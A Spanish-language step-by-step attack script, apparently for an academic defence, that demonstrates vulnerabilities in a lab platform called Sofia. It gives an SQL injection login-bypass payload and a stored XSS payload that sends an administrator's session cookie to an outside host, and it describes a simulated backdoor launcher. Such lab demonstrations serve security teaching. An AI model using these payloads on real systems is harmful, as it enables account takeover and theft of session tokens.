Auditoría Ofensiva

Guion de Ataques y Explotación

Procedimiento técnico detallado paso a paso para la demostración de vulnerabilidades

💥 Ataque 1: Inyección SQL (Bypass de Autenticación)

Este ataque demuestra la explotación de consultas dinámicas que carecen de parametrización en el motor de base de datos PostgreSQL.

Procedimiento Paso a Paso:

1. Navegue al formulario de autenticación en la Consola de Auditoría (/consola).

2. Introduzca el siguiente payload exacto en el campo de Correo Electrónico:

admin@sofia.local' OR '1'='1' --

3. Introduzca cualquier carácter en el campo de **Contraseña** (por ejemplo: 1234) y envíe el formulario.

Explicación para el Tribunal
La consulta del lado del servidor se concatena de forma directa, permitiendo que el operador OR '1'='1' fuerce a la base de datos a retornar verdadero incondicionalmente, saltando la comprobación hash de la contraseña y otorgando una sesión JWT de Administrador.

💥 Ataque 2: Scripting en Sitios Cruzados Persistente (Stored XSS)

Demostración del almacenamiento persistente de payloads javascript maliciosos en la base de datos para secuestrar credenciales de sesión activa de otros tenants.

Procedimiento Paso a Paso:

1. Inicie sesión en un cliente (por ejemplo, iberdrola@sofia.local).

2. Acceda al envío de tickets de soporte técnico e inyecte el siguiente código javascript en el cuerpo del mensaje:

<script>fetch('https://sofia-n8n.serveousercontent.com/log?c=' + document.cookie)</script>

3. Guarde el ticket. Cuando el administrador del SOC acceda a auditar los tickets de soporte, la cookie de sesión activa que almacena su Token JWT será exfiltrada al servidor del atacante.

Explicación para el Tribunal
La falta de saneamiento y filtrado de entidades HTML permite guardar directamente scripts ejecutables en la base de datos, los cuales son renderizados por el navegador del administrador sin control de seguridad.

💥 Ataque 3: Persistencia Avanzada (Kit de Auditoría / Backdoor)

Demuestra el comportamiento de un atacante posterior al compromiso inicial para instalar canales persistentes de bajo ruido dentro del servidor backend.

Procedimiento Paso a Paso:

1. Ejecute el lanzador local desde el directorio de scripts:

scripts/lanzar-rootkit.bat

2. El script `sofia-audit-framework.py` se conectará a la API Express y simulará la inyección de una puerta trasera en la base de datos PostgreSQL, la cual descarga información sensible de manera dosificada para evitar alarmas volumétricas.

Explicación para el Tribunal
Esta simulación permite evaluar si las firmas defensivas heurísticas del WAF del SOC son capaces de correlacionar accesos no habituales procedentes de IPs ajenas al segmento corporativo y reportar alertas automáticas.
